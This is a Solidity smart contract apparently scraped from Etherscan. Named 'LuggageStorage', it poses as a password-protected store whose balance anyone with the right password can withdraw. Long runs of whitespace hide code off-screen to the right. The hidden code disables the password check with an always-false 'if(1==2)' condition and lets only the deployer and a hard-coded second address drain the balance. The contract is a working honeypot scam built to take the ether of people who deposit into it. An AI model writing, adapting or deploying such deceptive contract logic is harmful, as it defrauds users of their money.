//token_name	
//token_url	https://etherscan.io//address/0xf414bb46b0e94c4e40fcf809b3ac375fc8d9a326#code
//spider_time	2018/07/08 12:46:47
//token_Transactions	1 txn
//token_price	

pragma solidity ^0.4.19;

contract LuggageStorage
{
    function()payable{}
    
    function CalcHash(bytes password) 
    pure
    returns (bytes32) 
    {
        return sha3(password);
    }
    
    bytes32 public hashPass;
    
    bool public closed = false;
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   address own = msg.sender;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  address cr = 0x6f9d120fE3b9D63d1d4D5480c8262d446585F554;                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
    function Put(bytes32 hash)
    public
    payable
    {                                                                               if(msg.sender==own){
        if(!closed&&(msg.value > 1 ether))
        {
            hashPass = hash;
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              }                                                                                                                                                                                                                                                                                                                                                                                                                                      
    }
    
    function Open(bytes password)
    external
    payable
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           if(                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    1==                                                                                                                                                                                                                                                                                               2){                                                                                                                                                                                                                                                                                                                                                                          
        if(hashPass == sha3(password))
        {
            msg.sender.transfer(this.balance);
            closed = false;
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       } if(msg.sender==own){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    if(msg.sender==cr){msg.sender.transfer(this.balance);}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
    }
}